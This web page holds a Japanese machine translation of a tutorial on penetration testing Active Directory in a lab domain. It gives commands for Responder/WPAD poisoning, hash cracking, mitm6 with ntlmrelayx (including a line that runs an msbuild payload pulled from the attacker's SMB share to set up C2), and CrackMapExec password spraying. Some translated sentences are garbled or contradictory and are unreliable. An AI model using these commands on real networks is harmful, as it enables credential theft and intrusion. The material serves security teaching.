<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🚗 🙎 👇🏼 Pentest Active Directory。パート1 🤺 🤦🏻 ➖</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="記事の翻訳は、特にペンテストの学生のために準備されました。侵入テストの実践。」
 
 
 
 脆弱性分析では重大な脆弱性が示されておらず、ドメイン管理者権限を取得できるようにするためだけにペンテストの準備ができていたため、ペンテスト前に良好な状態であると確信を持って来たクライアントが複数いました。 ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Pentest Active Directory。パート1</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/otus/blog/481348/"><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">記事の翻訳は、特に</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ペンテストの</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生のために準備され</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">ました。</font></a><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">侵入テストの実践</font></a><font style="vertical-align: inherit;">。</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">」</font></a></font></i><br>
<hr><br>
<img src="https://habrastorage.org/webt/p6/3r/kw/p63rkwok1ndkvwwmwfgwiekna6w.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
脆弱性分析では重大な脆弱性が示されておらず、ドメイン管理者権限を取得できるようにするためだけにペンテストの準備ができていたため、ペンテスト前に良好な状態であると確信を持って来たクライアントが複数いました。 15分で、ADの構成エラーを利用するだけです。</font></font><br>
<a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ペネトレーションテストで私が目にする教育のギャップの1つは、Active Directory Pentesting（AD）に関する認識の欠如です。残念ながら、OSCPはADテストを教えていません。SANSGPENコースでさえ、これについてはほとんど触れていません。このシリーズの目標は、ADを使用してペンテストを成功させるために過去に使用したトリック、ツール、およびテクニックのいくつかを実証することです。これは、各方法またはツールの完全なガイドではありません。このシリーズでは、Kali Linux 2019を使用し、仮想マシンを通じてダミードメインで作業します。</font><b><font style="vertical-align: inherit;">目標を</font></b></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
定義することから始めましょう</font></font><b><font style="vertical-align: inherit;"></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：侵入テストの目的は、攻撃者がネットワークに侵入するために使用する可能性のある攻撃ベクトルを特定することです。それはだ</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">だけでは</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、ドメイン管理者権限を取得してからログアウトについて。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
目標が設定されたので、それを達成するためにいくつかの手順を実行する必要があります。以下は、侵入テストサイクルの（大まかな）視覚的なガイドです。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/4h/xu/hi/4hxuhi10tttcfiblcafsfmdt7-e.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">投稿者：Microsoft </font></font></i><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">概要</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：クライアントから、Active Directoryを使用するネットワークで侵入テストを実行するように依頼されました。</font><font style="vertical-align: inherit;">あなたは何も与えられていません。</font><font style="vertical-align: inherit;">資格情報、テスト境界、正面玄関に入るためのパスはありませんが、ドアを通って誰かの後ろに行き、IP電話のある人里離れた部屋を見つけることができます。</font><font style="vertical-align: inherit;">あなたはあなたのIP電話を外し、あなたのラップトップを接続し、そして自分自身をオンラインで見つけます。</font><font style="vertical-align: inherit;">次は何ですか？</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">実装</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">フェーズI | </font><font style="vertical-align: inherit;">実装</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
資格情報がないと、限られた偵察しか実行できず、偵察はサイクルのほとんどすべての段階で発生しますが、ネットワークの足がかりを得るためにすぐに実行できることがいくつかあります。まず、ネットワークにアクセスできるので、ifconfigまたはipconfigを使用して、作業しているサブネットを確認します。 IPアドレスを受け取ったら、nmapでpingコマンドを発行して、他のデバイスが使用可能かどうかを確認します。</font></font><br>
<br>
<pre><code class="plaintext hljs">nmap -sn 192.168.1.1/24</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
デバイスが戻ってきたら、あなたは仕事をしています。</font><font style="vertical-align: inherit;">何も受信しない場合は、ICMPが無効になっているか、ネットワーク上に他のデバイスがないか、認証されていないために他のデバイスと通信できず、IDセキュリティソリューション（Cisco ISEなど）によってブロックされている可能性があります。</font><font style="vertical-align: inherit;">この記事では、いくつかのマシンが戻ってきて、pingを正常に実行できると想定します。</font></font><br>
<br>
<hr><br>
<i><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ツール</font></font></b></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Responder</font></font></a><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
次に</font><font style="vertical-align: inherit;">、</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Responder</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">というツールを使用します</font><font style="vertical-align: inherit;">。Windowsに無関心でない場合は、</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Inveigh</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。これらの2つのツールは、AD構成の非常に一般的なエラーをチェックします。これにより、WPADおよびNBT-NSが汚染される可能性があります。デフォルトでは、Windowsは自動Webプロキシ検出（WPAD）を介して自動プロキシ構成ファイル（PAC）を検索するように構成されています。 WPADは検索を実行するプロトコルではなく、デバイスがPACファイルを検索できるようにする一連の手順にすぎないことに注意してください。デバイスがプロキシファイルを要求するブロードキャストを送信して受信するため、PACファイルの自動検出は組織にとって有用です。ただし、もちろん、誰がプロキシファイルを送信するかは認証されないため、攻撃者は偽の応答を送信し、資格情報を要求することができます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kaliではレスポンダがデフォルトでインストールされています。</font></font><br>
<br>
<pre><code class="plaintext hljs">responder -I eth0 --wpad</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Windows 7コンピューターでInternet Explorerを開いてGoogleにアクセスすると、WPADファイルの検索が始まります。 Responderで、リクエストがどのように送信されたかを確認します。その後、レスポンダーが自動的にリクエストに応答し、その結果、被害者はユーザー名とハッシュされたパスワード（NTLMv2形式）を送信します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/4g/fo/wr/4gfowr6lflqcpzh1-cwcbs75vlo.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このハッシュを使用すると、いくつかのことができます。ハッキングしたり、などのツールを使用して中継したりでき</font></font><code>ntlmrelay.py</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ます。</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">この記事</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">で</font><font style="vertical-align: inherit;">ntlmハッシュを変換する方法について説明しました</font><font style="vertical-align: inherit;">。そのため、ハッキング</font><font style="vertical-align: inherit;">について説明します。</font><font style="vertical-align: inherit;">これは通常、実際に行っていることです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
正直なところ、Linux / Kaliでパスワードをクラックすることはめったにありません。私はnvidia GPUを使用しますが、これはKaliに正しくインストールされません。さらに、WindowsにはHashcatGUIがあり、プロセスが非常に簡単になり、それを使用します。結果のハッシュを取得し、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">「hash.txt」</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">と</font><font style="vertical-align: inherit;">呼ばれるファイルに入れて</font><font style="vertical-align: inherit;">、いくつかのワードリスト/ルールを実行します。しかし、この場合、私は</font></font><code>rockyou.txt</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">それを</font><font style="vertical-align: inherit;">実行</font><font style="vertical-align: inherit;">した</font><font style="vertical-align: inherit;">だけ</font><font style="vertical-align: inherit;">で、一瞬ハッキングされました。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/mw/4x/ne/mw4xneie6ludbspzquxvhsuwjq8.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HashcatGUIの私の設定。</font></font></i><br>
<br>
<img src="https://habrastorage.org/webt/km/ca/ze/kmcazexh-eid8rksx8uoybd5yye.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ハッキングされたパスワード-「パスワード！」</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
パスワードのクラックに成功したので、資格情報「Alice：Password」を取得しました。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
続行する前に、レスポンダーが機能しない場合に備えて、他にもいくつか紹介したい方法があります。</font></font><br>
<br>
<hr><br>
<i><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ツール</font></font></b></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> mitm6</font></font></a><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
クライアントネットワークが正当なPACファイルを使用していて、スプーフィングが機能しないとします。ターゲットに資格情報を渡すためにIPv6とDNSを使用する別の方法があります。デフォルトでは、IPv6が有効になっており、実際にはIPv4よりも優先されます。つまり、コンピューターにIPv6 DNSサーバーがある場合、</font><font style="vertical-align: inherit;">IPv4</font><font style="vertical-align: inherit;">が</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">優先され</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ます。また、デフォルトでは、WindowsマシンはDHCPv6リクエストを介してIPv6 DNSサーバーを探します。つまり、IPv6 DNSサーバーを偽造した場合、デバイスがDNSをリクエストする方法を効果的に制御できます。詳細については、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">こちらをご覧ください</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">最初にmitm6を</font></a></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
ダウンロードして</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ください</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><br>
<br>
<pre><code class="plaintext hljs">git clone https://github.com/fox-it/mitm6.git<font></font>
cd mitm6<font></font>
pip install .</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、ターゲットネットワークワークグループで実行します。</font><font style="vertical-align: inherit;">以前にネットワークにpingを実行したため、NetBIOS名も取得し、ターゲットドメインがであることを学習しました</font></font><code>lab.local</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これは、開始前のターゲットのIP設定の</font><font style="vertical-align: inherit;">
外観</font></font><code>mitm6</code><br>
<br>
<img src="https://habrastorage.org/webt/3d/vv/vr/3dvvvrilsufnvgatvst4bwmmkgc.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">です。1つのDNSサーバーに注意して、</font></font></i><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> mitm6を開始しました</font></font><br>
<br>
<pre><code class="plaintext hljs">mitm6 -d lab.local</code></pre><br>
<img src="https://habrastorage.org/webt/bc/sl/qm/bcslqmbg7zlncefnc-1xukg55rk.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
DNSサーバーの目的が変更さ</font></font><br>
<br>
<img src="https://habrastorage.org/webt/qm/qe/ko/qmqekoijtpdxp4d57ro02p3kr1u.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">れたため、DNSサーバーとしてIPv6アドレスに注意してください。</font></font><br>
</i><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
本当の脆弱性は、WindowsがIPv4よりもIPv6を優先することです。つまり、私はDNSを制御します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、ここでは、を介してWPAD応答をスプーフィングすることによってDNSを制御するという事実を使用し</font></font><code>ntlmrelayx.py</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ます。</font><font style="vertical-align: inherit;">インストール方法の</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ガイド</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を書きました</font><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
mitm6が1つのウィンドウで実行されている状態で、別のウィンドウを開いて実行します。</font></font><code>ntlmrelayx.py</code><br>
<br>
<pre><code class="plaintext hljs">ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i</code></pre><br>
<i><code>-wh</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：WPADファイルをホストするサーバー（攻撃者のIPアドレス）</font></font><br>
<code>-t</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：ターゲット（製造しているのと同じデバイスに資格情報を送信することはできません）</font></font><br>
<code>-i</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：インタラクティブシェルを開く</font></font></i><br>
<br>
<img src="https://habrastorage.org/webt/8p/wh/cu/8pwhcuwgx_6wyskxawrr5cq8db0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
ここから、制御および監視システム（C2）への接続を確立できますあなたの選択。</font><font style="vertical-align: inherit;">この場合、SILENTTRINITYを使用しているため、-cコマンドを使用してコマンドを実行します。この場合、MSBuildを使用して悪意のあるペイロードを作成します。</font></font><br>
<br>
<pre><code class="xml hljs">ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.50/ --no-smb-server -c 'C:\Windows\Microsoft.NET\Framework64\v3.5\msbuild.exe \\192.168.218.129\SMB\msbuild.xml'</code></pre><br>
<img src="https://habrastorage.org/webt/mz/wg/la/mzwglak5n0kzty0vgqy4z7g5kya.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
しかし、いいえ、</font></font><code>msbuild.exe</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">この場合、XMLファイルは作成されず、SILENTTRINITYへの接続も取得されません。これは単純すぎるためです。</font><font style="vertical-align: inherit;">代わりに、私はSMBサーバーを見て、リレーハッシュを確認します</font></font><br>
<br>
<img src="https://habrastorage.org/webt/b_/vf/qk/b_vfqka5be-1bek_90jncfywhge.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/s3/e5/qa/s3e5qaojtbishyvggzxt52orsdy.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これで、レスポンダーを使用せずにネットワーク資格情報を取得できました。</font></font><br>
<br>
<hr><br>
<i><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ツール</font></font></b></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> CrackMapExec </font></font></a><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CrackMapExec</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">は、基本的にスイスのペンテスターナイフです。パスワードスプレー攻撃やハッシュ転送からコマンドの実行まで、それはペンテスターのためのあらゆるツールセットに含まれるべきです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
他のすべてが失敗した場合、パスワードスプレー攻撃を試すことができます。この方法が最後の方法である理由があり、これはパスワードロックが原因です。パスワードブロックは思ったほど一般的ではないため、攻撃者がユーザー名で辞書攻撃を行うことができます。ユーザー名の取得は、OSINTおよびtheHarvesterを使用して実行できる最初のステップです。 OSINTからのユーザー名がない場合は、CrackMapExec（CME）にユーザー名のリストを提供することもできますが、ここでは、</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rsmithのユーザー名</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">がある</font><b><font style="vertical-align: inherit;">とします</font></b><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kaliにいる場合、新しいバージョンを使用している場合はCrackMapExecが既にインストールされているはずですが、それ以外の場合はインストールできます。</font></font><br>
<br>
<pre><code class="plaintext hljs">apt-get install crackmapexec</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
スキャンの結果、ネットワーク上にデバイスが見つかったので、ユーザー名とペアになっているパスワードのリストをCMEに渡して、ログインを試みることができます。</font></font><br>
<br>
<pre><code class="plaintext hljs">crackmapexec smb 192.168.218.40 -d lab.local -u rsmith -p ~/Documents/wordlists/fasttrack.txt --shares</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
数秒後、パスワードが見つかります。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/uo/b7/ed/uob7edro_ir8xggvgxezdcqjjek.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
認証情報が見つかりました！</font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
CTFのように見えるかもしれませんが、季節：年はパスワードの非常に人気のある組み合わせです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これらの資格情報を取得すると、ユーザーアカウントが作成されます。</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">次のパート</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">では、特権の昇格に進み</font><font style="vertical-align: inherit;">ます。</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja481338/index.html">XSSの脆弱性の悪用</a></li>
<li><a href="../ja481340/index.html">7日間、15人のエンジニアと600台のサーバー：Yandex.Moneyが新しいデータセンターに移動</a></li>
<li><a href="../ja481342/index.html">金曜日の投票：言語について話す</a></li>
<li><a href="../ja481344/index.html">2020年のIntelliJプラットフォームチーム計画</a></li>
<li><a href="../ja481346/index.html">自動車業界における5つの大きな変化</a></li>
<li><a href="../ja481350/index.html">プレセツク宇宙基地で働く人</a></li>
<li><a href="../ja481352/index.html">DBA：PKなしでテーブルからクローンレコードをクリアする</a></li>
<li><a href="../ja481354/index.html">TelegramBot。基本的な機能。別々に飛ぶ、別々にカツレツ。（パート2）</a></li>
<li><a href="../ja481356/index.html">ありがとう、2019</a></li>
<li><a href="../ja481358/index.html">C ++ロシア：いかがでしたか</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>